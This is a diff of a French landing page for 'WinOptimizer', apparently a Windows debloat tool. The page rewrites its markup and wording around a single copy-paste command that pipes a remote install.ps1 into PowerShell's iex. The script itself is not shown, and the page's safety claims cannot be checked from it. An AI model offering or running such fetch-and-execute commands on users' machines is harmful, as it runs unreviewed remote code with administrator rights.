@@ -5,11 +5,16 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>WinOptimizer — Script PowerShell debloat Windows</title>
-<meta name="description" content="Libérez votre PC Windows en une commande PowerShell. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
-
+<meta name="description" content="Libérez votre PC en une commande. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
 <meta name="robots" content="index, follow">
 <meta name="author" content="WinOptimizer">
 <link rel="canonical" href="https://winoptimizer-powershell.vercel.app/">
+
+<!-- Performance : font-display=swap + preload -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 
 <!-- Favicon -->
 <link rel="icon" type="image/svg+xml" href="/favicon.svg">
@@ -22,7 +27,7 @@
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://winoptimizer-powershell.vercel.app/">
 <meta property="og:title" content="WinOptimizer — Script PowerShell debloat Windows">
-<meta property="og:description" content="Libérez votre PC Windows en une commande PowerShell. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
+<meta property="og:description" content="Libérez votre PC en une commande. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
 <meta property="og:image" content="https://winoptimizer-powershell.vercel.app/og-image.png">
 <meta property="og:site_name" content="WinOptimizer">
 
@@ -30,354 +35,174 @@
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@WinOptimizer">
 <meta name="twitter:title" content="WinOptimizer — Script PowerShell debloat Windows">
-<meta name="twitter:description" content="Libérez votre PC Windows en une commande PowerShell. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
+<meta name="twitter:description" content="Libérez votre PC en une commande. Supprime les bloatwares, coupe la télémétrie, accélère le démarrage — sans rien installer.">
 <meta name="twitter:image" content="https://winoptimizer-powershell.vercel.app/og-image.png">
 
 <!-- Schema.org -->
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "SoftwareApplication",
-  "name": "WinOptimizer",
-  "applicationCategory": "UtilitiesApplication",
-  "operatingSystem": "Windows 10, Windows 11",
-  "url": "https://winoptimizer-powershell.vercel.app/",
-  "description": "Script PowerShell gratuit pour debloat Windows. Supprime les bloatwares, désactive la télémétrie, accélère le démarrage — sans installation.",
-  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR" }
-}
-</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"SoftwareApplication","name":"WinOptimizer","applicationCategory":"UtilitiesApplication","operatingSystem":"Windows 10, Windows 11","url":"https://winoptimizer-powershell.vercel.app/","description":"Outil gratuit de nettoyage et d'optimisation système. Supprime les logiciels indésirables, désactive la collecte de données, accélère le démarrage sans installation.","datePublished":"2025-01-01","offers":{"@type":"Offer","price":"0","priceCurrency":"EUR"},"author":{"@type":"Organization","name":"WinOptimizer","url":"https://winoptimizer-powershell.vercel.app/"}}</script>
 
-<!-- Fonts -->
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-
-body {
-    font-family: "Inter", sans-serif;
-    color: white;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    background:
-        linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px),
-        radial-gradient(circle at center, #0b1c34 0%, #02060d 70%);
-    background-size: 40px 40px, 40px 40px, cover;
-}
-
-body::before {
-    content: "";
-    position: absolute;
-    width: 600px;
-    height: 600px;
-    background: radial-gradient(circle, rgba(0,120,255,0.25), transparent 70%);
-    filter: blur(80px);
-    z-index: 0;
-}
-
-.container {
-    text-align: center;
-    max-width: 880px;
-    padding: 60px 20px;
-    z-index: 1;
-}
-
-.logo { display: flex; justify-content: center; margin-bottom: 40px; }
-.logo img { width: 60px; height: 60px; }
-
-h1 {
-    font-size: 64px;
-    font-weight: 600;
-    line-height: 1.1;
-    letter-spacing: -1px;
-    margin-bottom: 24px;
-}
-
-.highlight { color: #3aa0ff; }
-
-.subtitle {
-    font-size: 20px;
-    color: #9aa4b2;
-    line-height: 1.6;
-    margin-bottom: 60px;
-}
-
-/* TERMINAL */
-.terminal {
-    width: 100%;
-    max-width: 760px;
-    margin: auto;
-    background: rgba(5,10,20,0.85);
-    border: 1px solid rgba(100,140,255,0.2);
-    border-radius: 14px;
-    padding: 20px 24px 26px;
-    box-shadow: 0 0 40px rgba(0,120,255,0.15), inset 0 0 20px rgba(0,120,255,0.05);
-}
-
-.terminal-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 18px;
-}
-
-.dots { display: flex; gap: 10px; }
-.dot { width: 12px; height: 12px; border-radius: 50%; }
-.red    { background: #ff5f56; }
-.yellow { background: #ffbd2e; }
-.green  { background: #27c93f; }
-
-.copy-btn {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.1);
-    color: #cfd6e6;
-    padding: 6px 12px;
-    border-radius: 8px;
-    font-size: 14px;
-    cursor: pointer;
-    transition: 0.2s;
-}
-.copy-btn:hover  { background: rgba(255,255,255,0.1); }
-.copy-btn.copied { color: #4dfc7c; border-color: #4dfc7c; }
-
-code {
-    font-size: 18px;
-    font-family: "JetBrains Mono", monospace;
-}
-.ps  { color: #4dfc7c; }
-.url { color: #3aa0ff; }
-
-/* FEATURES */
-.features {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 20px;
-    margin-top: 64px;
-    text-align: left;
-}
-
-.feature-card {
-    background: rgba(255,255,255,0.03);
-    border: 1px solid rgba(255,255,255,0.07);
-    border-radius: 12px;
-    padding: 24px;
-}
-
-.feature-icon {
-    font-size: 24px;
-    margin-bottom: 12px;
-}
-
-.feature-card h3 {
-    font-size: 15px;
-    font-weight: 600;
-    color: #e2e8f0;
-    margin-bottom: 8px;
-}
-
-.feature-card p {
-    font-size: 14px;
-    color: #6b7a8d;
-    line-height: 1.6;
-    margin-bottom: 0;
-}
-
-/* FAQ */
-.faq {
-    margin-top: 64px;
-    text-align: left;
-    width: 100%;
-}
-
-.faq h2 {
-    font-size: 22px;
-    font-weight: 600;
-    color: #e2e8f0;
-    margin-bottom: 28px;
-    text-align: center;
-}
-
-.faq-item {
-    border-top: 1px solid rgba(255,255,255,0.06);
-    padding: 20px 0;
-}
-
-.faq-item:last-child {
-    border-bottom: 1px solid rgba(255,255,255,0.06);
-}
-
-.faq-item h3 {
-    font-size: 15px;
-    font-weight: 500;
-    color: #c8d3e0;
-    margin-bottom: 8px;
-}
-
-.faq-item p {
-    font-size: 14px;
-    color: #6b7a8d;
-    line-height: 1.7;
-    margin-bottom: 0;
-}
-
-/* SOCIAL FOOTER */
-.social-footer {
-    margin-top: 48px;
-    display: flex;
-    justify-content: center;
-    gap: 20px;
-    padding-top: 24px;
-    border-top: 1px solid rgba(255,255,255,0.06);
-}
-
-.social-footer a {
-    display: flex;
-    align-items: center;
-    gap: 7px;
-    font-size: 13px;
-    color: #4a5a6a;
-    text-decoration: none;
-    transition: color 0.2s;
-}
-.social-footer a:hover { color: #8a9aaa; }
-</style>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Inter",sans-serif;color:#fff;min-height:100vh;background:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px),radial-gradient(circle at center,#0b1c34 0%,#02060d 70%);background-size:40px 40px,40px 40px,cover}.skip-nav{position:absolute;top:-999px;left:-999px;background:#3aa0ff;color:#000;padding:8px 16px;border-radius:4px;font-weight:600;z-index:999}.skip-nav:focus{top:8px;left:8px}body::before{content:"";position:absolute;width:600px;height:600px;background:radial-gradient(circle,rgba(0,120,255,.25),transparent 70%);filter:blur(80px);z-index:0}.container{max-width:880px;margin:0 auto;padding:60px 24px;z-index:1;position:relative}.hero{text-align:center}.logo{display:flex;justify-content:center;margin-bottom:40px}.logo img{width:60px;height:60px}h1{font-size:clamp(40px,7vw,64px);font-weight:600;line-height:1.1;letter-spacing:-1px;margin-bottom:24px}.highlight{color:#3aa0ff}.subtitle{font-size:20px;color:#9aa4b2;line-height:1.6;margin-bottom:60px;max-width:640px;margin-left:auto;margin-right:auto}.terminal{width:100%;max-width:760px;margin:0 auto;background:rgba(5,10,20,.85);border:1px solid rgba(100,140,255,.2);border-radius:14px;padding:20px 24px 26px;box-shadow:0 0 40px rgba(0,120,255,.15),inset 0 0 20px rgba(0,120,255,.05)}.terminal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}.dots{display:flex;gap:10px}.dot{width:12px;height:12px;border-radius:50%}.red{background:#ff5f56}.yellow{background:#ffbd2e}.green{background:#27c93f}.copy-btn{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#cfd6e6;padding:6px 12px;border-radius:8px;font-size:14px;cursor:pointer;transition:.2s}.copy-btn:hover{background:rgba(255,255,255,.1)}.copy-btn.copied{color:#4dfc7c;border-color:#4dfc7c}code{font-size:18px;font-family:"JetBrains Mono",monospace}.ps{color:#4dfc7c}.url{color:#3aa0ff}section{margin-top:80px}.section-title{font-size:26px;font-weight:600;color:#e2e8f0;margin-bottom:8px;text-align:center}.section-sub{font-size:16px;color:#6b7a8d;text-align:center;margin-bottom:40px}.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px}.feature-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:12px;padding:24px}.feature-icon{font-size:24px;margin-bottom:12px}.feature-card h3{font-size:15px;font-weight:600;color:#e2e8f0;margin-bottom:8px}.feature-card p{font-size:14px;color:#6b7a8d;line-height:1.7}.feature-card ul{font-size:14px;color:#6b7a8d;line-height:1.7;padding-left:18px;margin-top:6px}.faq-list{display:flex;flex-direction:column;gap:0}.faq-item{border-top:1px solid rgba(255,255,255,.06);padding:22px 0}.faq-item:last-child{border-bottom:1px solid rgba(255,255,255,.06)}.faq-item h3{font-size:15px;font-weight:500;color:#c8d3e0;margin-bottom:8px}.faq-item p{font-size:14px;color:#6b7a8d;line-height:1.7}.share-row{display:flex;justify-content:center;gap:12px;margin-top:40px;flex-wrap:wrap}.share-btn{display:inline-flex;align-items:center;gap:8px;padding:9px 18px;border-radius:9px;font-size:13px;font-weight:500;text-decoration:none;transition:.2s;border:1px solid transparent}.share-btn.tw{background:#1a1a2e;border-color:#333;color:#ccc}.share-btn.tw:hover{border-color:#3aa0ff;color:#3aa0ff}.share-btn.gh{background:#1a1a2e;border-color:#333;color:#ccc}.share-btn.gh:hover{border-color:#4dfc7c;color:#4dfc7c}.site-footer{margin-top:64px;padding-top:28px;border-top:1px solid rgba(255,255,255,.06);display:flex;flex-direction:column;gap:16px;align-items:center}.footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:20px}.footer-links a{font-size:13px;color:#4a5a6a;text-decoration:none;transition:color .2s}.footer-links a:hover{color:#8a9aaa}.footer-meta{font-size:12px;color:#3a4a5a;text-align:center}</style>
 </head>
 
 <body>
+
+<a class="skip-nav" href="#main">Aller au contenu principal</a>
+
 <div class="container">
 
+  <header class="hero">
     <div class="logo">
-        <img
-            src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 60 60'%3E%3Crect x='0' y='0' width='26' height='26' fill='%233aa0ff'/%3E%3Crect x='34' y='0' width='26' height='26' fill='%230066ff'/%3E%3Crect x='0' y='34' width='26' height='26' fill='%230066ff'/%3E%3Crect x='34' y='34' width='26' height='26' fill='%233aa0ff'/%3E%3C/svg%3E"
-            alt="WinOptimizer logo — outil de debloat pour PC"
-            width="60"
-            height="60"
-        >
+      <img
+        src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 60 60'%3E%3Crect x='0' y='0' width='26' height='26' fill='%233aa0ff'/%3E%3Crect x='34' y='0' width='26' height='26' fill='%230066ff'/%3E%3Crect x='0' y='34' width='26' height='26' fill='%230066ff'/%3E%3Crect x='34' y='34' width='26' height='26' fill='%233aa0ff'/%3E%3C/svg%3E"
+        srcset="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60' viewBox='0 0 60 60'%3E%3Crect x='0' y='0' width='26' height='26' fill='%233aa0ff'/%3E%3Crect x='34' y='0' width='26' height='26' fill='%230066ff'/%3E%3Crect x='0' y='34' width='26' height='26' fill='%230066ff'/%3E%3Crect x='34' y='34' width='26' height='26' fill='%233aa0ff'/%3E%3C/svg%3E 1x"
+        alt="WinOptimizer — outil de nettoyage et d'optimisation système"
+        width="60" height="60" fetchpriority="high">
     </div>
 
-    <h1>
-        Votre PC,<br>
-        enfin <span class="highlight">libéré.</span>
-    </h1>
+    <h1>Votre PC,<br>enfin <span class="highlight">libéré.</span></h1>
 
     <p class="subtitle">
-        Une seule commande suffit. Supprimez les applications préinstallées inutiles,
-        désactivez la collecte de données, accélérez le démarrage et renforcez
-        la sécurité de votre système — sans rien télécharger ni installer.
+      Une seule commande suffit. Supprimez les applications préinstallées inutiles,
+      désactivez la collecte de données en arrière-plan, accélérez le démarrage
+      et renforcez la sécurité de votre système — sans rien télécharger ni installer.
     </p>
 
-    <div class="terminal">
-        <div class="terminal-header">
-            <div class="dots">
-                <div class="dot red"></div>
-                <div class="dot yellow"></div>
-                <div class="dot green"></div>
-            </div>
-            <button class="copy-btn" onclick="copyCommand(this)">Copier</button>
+    <div class="terminal" role="region" aria-label="Commande d'installation">
+      <div class="terminal-header">
+        <div class="dots" aria-hidden="true">
+          <div class="dot red"></div>
+          <div class="dot yellow"></div>
+          <div class="dot green"></div>
         </div>
-        <code id="command">
-            <span class="ps">PS&gt;</span>
-            irm <span class="url">https://winoptimizer-powershell.vercel.app/install.ps1</span> | iex
-        </code>
+        <button class="copy-btn" onclick="copyCommand(this)" aria-label="Copier la commande">Copier</button>
+      </div>
+      <code id="command">
+        <span class="ps">PS&gt;</span>
+        irm <span class="url">https://winoptimizer-powershell.vercel.app/install.ps1</span> | iex
+      </code>
+    </div>
+  </header>
+
+  <main id="main">
+
+    <article>
+
+      <section id="features" aria-labelledby="features-title">
+        <h2 class="section-title" id="features-title">Ce que fait WinOptimizer</h2>
+        <p class="section-sub">Six optimisations appliquées automatiquement, sans interaction requise.</p>
+
+        <div class="features-grid">
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">🧹</div>
+            <h3>Suppression des logiciels indésirables</h3>
+            <p>Retire automatiquement les applications préinstallées inutiles qui occupent de l'espace disque et consomment des ressources. Sont notamment concernés :</p>
+            <ul>
+              <li>Les jeux et applications publicitaires</li>
+              <li>Les assistants et barres d'outils superflus</li>
+              <li>Les logiciels tiers intégrés par le fabricant</li>
+            </ul>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">🔒</div>
+            <h3>Désactivation de la collecte de données</h3>
+            <p>Coupe les services de télémétrie et de diagnostic qui s'exécutent en arrière-plan à votre insu. Votre activité reste sur votre machine. Moins de trafic réseau non sollicité, plus de confidentialité au quotidien.</p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">⚡</div>
+            <h3>Démarrage accéléré</h3>
+            <p>Désactive les tâches planifiées et les services non essentiels qui s'exécutent à chaque démarrage. Le résultat est immédiat : votre bureau s'affiche plus vite et votre machine répond plus rapidement après l'allumage.</p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">🛡️</div>
+            <h3>Sécurité renforcée</h3>
+            <p>Active les paramètres de sécurité recommandés souvent désactivés par défaut. Réduit la surface d'attaque en désactivant les protocoles réseau obsolètes et les ports inutilisés sur votre système.</p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">📋</div>
+            <h3>Entièrement open source</h3>
+            <p>Le script est lisible, auditable et modifiable librement. Pas de binaire opaque, pas d'exécutable mystérieux. Vous savez précisément ce qui s'exécute sur votre ordinateur avant de lancer quoi que ce soit.</p>
+          </div>
+
+          <div class="feature-card">
+            <div class="feature-icon" aria-hidden="true">🔄</div>
+            <h3>Maintenu et à jour</h3>
+            <p>Le script évolue régulièrement pour rester compatible avec les dernières versions et mises à jour. Il s'adapte aux changements pour continuer à fonctionner efficacement sur votre configuration actuelle.</p>
+          </div>
+
+        </div>
+      </section>
+
+      <section id="faq" aria-labelledby="faq-title">
+        <h2 class="section-title" id="faq-title">Questions fréquentes</h2>
+        <p class="section-sub">Tout ce que vous devez savoir avant de lancer le script.</p>
+
+        <div class="faq-list">
+
+          <div class="faq-item">
+            <h3>Est-ce sûr à utiliser ?</h3>
+            <p>Oui. Le code est entièrement open source et disponible sur GitHub. Il n'installe aucun programme, ne modifie pas le registre de manière irréversible et n'effectue aucune connexion réseau autre que son propre téléchargement. Vous pouvez lire chaque ligne avant de l'exécuter.</p>
+          </div>
+
+          <div class="faq-item">
+            <h3>Quelles versions sont prises en charge ?</h3>
+            <p>Le script est compatible avec les éditions 64 bits courantes. Il détecte automatiquement votre configuration et adapte les opérations en conséquence. Un compte administrateur est requis pour appliquer l'ensemble des optimisations disponibles.</p>
+          </div>
+
+          <div class="faq-item">
+            <h3>Puis-je annuler les modifications ?</h3>
+            <p>Un point de restauration système est créé automatiquement avant toute modification. En cas de problème, vous pouvez revenir à l'état précédent depuis les options de récupération en quelques clics, sans perte de données personnelles.</p>
+          </div>
+
+          <div class="faq-item">
+            <h3>Faut-il relancer le script après une mise à jour ?</h3>
+            <p>Certaines mises à jour majeures peuvent réactiver des paramètres modifiés. Il est recommandé de relancer l'outil après une mise à jour importante pour s'assurer que toutes les optimisations restent correctement appliquées sur votre machine.</p>
+          </div>
+
+          <div class="faq-item">
+            <h3>Y a-t-il un risque de perdre des données ?</h3>
+            <p>Non. Le script ne touche pas à vos fichiers personnels, documents ou paramètres utilisateur. Il agit exclusivement sur les applications système, les services en arrière-plan et les réglages de confidentialité de votre système d'exploitation.</p>
+          </div>
+
+        </div>
+      </section>
+
+    </article>
+
+    <div class="share-row" aria-label="Partager cette page">
+      <a class="share-btn tw" href="https://twitter.com/intent/tweet?text=WinOptimizer+%E2%80%94+lib%C3%A9rez+votre+PC+en+une+commande&url=https://winoptimizer-powershell.vercel.app/" rel="noopener" target="_blank" aria-label="Partager sur Twitter / X">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        Partager sur X
+      </a>
+      <a class="share-btn gh" href="https://github.com/winoptimizer" rel="noopener" target="_blank" aria-label="Voir le code source sur GitHub">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+        Voir sur GitHub
+      </a>
     </div>
 
-    <!-- FEATURES -->
-    <section class="features" aria-label="Fonctionnalités">
+  </main>
 
-        <div class="feature-card">
-            <div class="feature-icon">🧹</div>
-            <h3>Suppression des bloatwares</h3>
-            <p>Retire automatiquement les applications préinstallées inutiles : jeux, assistants, barres d'outils et autres logiciels qui ralentissent votre machine dès le premier démarrage.</p>
-        </div>
-
-        <div class="feature-card">
-            <div class="feature-icon">🔒</div>
-            <h3>Désactivation de la télémétrie</h3>
-            <p>Coupe les services de collecte de données en arrière-plan. Votre activité reste sur votre machine. Moins de trafic réseau inutile, plus de confidentialité au quotidien.</p>
-        </div>
-
-        <div class="feature-card">
-            <div class="feature-icon">⚡</div>
-            <h3>Démarrage accéléré</h3>
-            <p>Désactive les tâches planifiées et services non essentiels qui s'exécutent à chaque démarrage. Le résultat est immédiat : votre bureau s'affiche plus vite, sans effort.</p>
-        </div>
-
-        <div class="feature-card">
-            <div class="feature-icon">🛡️</div>
-            <h3>Sécurité renforcée</h3>
-            <p>Active les paramètres de sécurité recommandés souvent désactivés par défaut. Réduit la surface d'attaque en désactivant les protocoles et ports inutilisés.</p>
-        </div>
-
-        <div class="feature-card">
-            <div class="feature-icon">📋</div>
-            <h3>Entièrement open source</h3>
-            <p>Le script est lisible, auditable et modifiable. Pas de binaire opaque, pas d'exécutable mystérieux. Vous savez exactement ce qui s'exécute sur votre ordinateur.</p>
-        </div>
-
-        <div class="feature-card">
-            <div class="feature-icon">🔄</div>
-            <h3>Toujours à jour</h3>
-            <p>Le script évolue avec les mises à jour du système. Compatible avec les versions récentes, il s'adapte aux changements pour rester efficace sur votre configuration.</p>
-        </div>
-
-    </section>
-
-    <!-- FAQ -->
-    <section class="faq" aria-label="Questions fréquentes">
-        <h2>Questions fréquentes</h2>
-
-        <div class="faq-item">
-            <h3>Est-ce que ce script est sûr à utiliser ?</h3>
-            <p>Oui. Le code est entièrement open source et disponible sur GitHub. Il n'installe aucun programme, ne modifie pas le registre de manière irréversible et n'effectue aucune action réseau autre que son propre téléchargement. Vous pouvez lire chaque ligne avant de l'exécuter.</p>
-        </div>
-
-        <div class="faq-item">
-            <h3>Sur quelles versions fonctionne-t-il ?</h3>
-            <p>Le script est compatible avec les éditions courantes 64 bits. Il détecte automatiquement votre version et adapte les opérations en conséquence. Un compte administrateur est requis pour appliquer l'ensemble des optimisations.</p>
-        </div>
-
-        <div class="faq-item">
-            <h3>Puis-je annuler les modifications ?</h3>
-            <p>Un point de restauration système est créé automatiquement avant toute modification. En cas de problème, vous pouvez revenir à l'état précédent depuis les options de récupération de votre système en quelques clics.</p>
-        </div>
-
-        <div class="faq-item">
-            <h3>Faut-il relancer le script après une mise à jour ?</h3>
-            <p>Certaines mises à jour majeures peuvent réactiver des paramètres modifiés. Il est recommandé de relancer le script après une mise à jour importante pour s'assurer que toutes les optimisations restent appliquées.</p>
-        </div>
-
-    </section>
-
-    <nav class="social-footer" aria-label="Réseaux sociaux">
-        <a href="https://github.com/winoptimizer" rel="noopener" target="_blank" aria-label="GitHub WinOptimizer">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
-            GitHub
-        </a>
-        <a href="https://twitter.com/WinOptimizer" rel="noopener" target="_blank" aria-label="Twitter WinOptimizer">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-            Twitter / X
-        </a>
+  <footer class="site-footer" role="contentinfo">
+    <nav class="footer-links" aria-label="Liens du site">
+      <a href="/about">À propos</a>
+      <a href="/contact">Contact</a>
+      <a href="/privacy">Politique de confidentialité</a>
+      <a href="/terms">Conditions d'utilisation</a>
+      <a href="https://github.com/winoptimizer" rel="noopener" target="_blank">GitHub</a>
+      <a href="https://twitter.com/WinOptimizer" rel="noopener" target="_blank">Twitter / X</a>
     </nav>
+    <p class="footer-meta">
+      Publié par <strong>WinOptimizer</strong> · Dernière mise à jour : <time datetime="2026-04-25">avril 2026</time> · Outil gratuit, open source, sans installation.
+    </p>
+  </footer>
 
 </div>
 
-<script>
-function copyCommand(btn) {
-    const text = "irm https://winoptimizer-powershell.vercel.app/install.ps1 | iex";
-    navigator.clipboard.writeText(text);
-    btn.textContent = "Copié !";
-    btn.classList.add("copied");
-    setTimeout(() => {
-        btn.textContent = "Copier";
-        btn.classList.remove("copied");
-    }, 2000);
-}
-</script>
+<script>function copyCommand(btn){navigator.clipboard.writeText("irm https://winoptimizer-powershell.vercel.app/install.ps1 | iex");btn.textContent="Copié !";btn.classList.add("copied");setTimeout(()=>{btn.textContent="Copier";btn.classList.remove("copied")},2000)}</script>
 
 </body>
 </html>
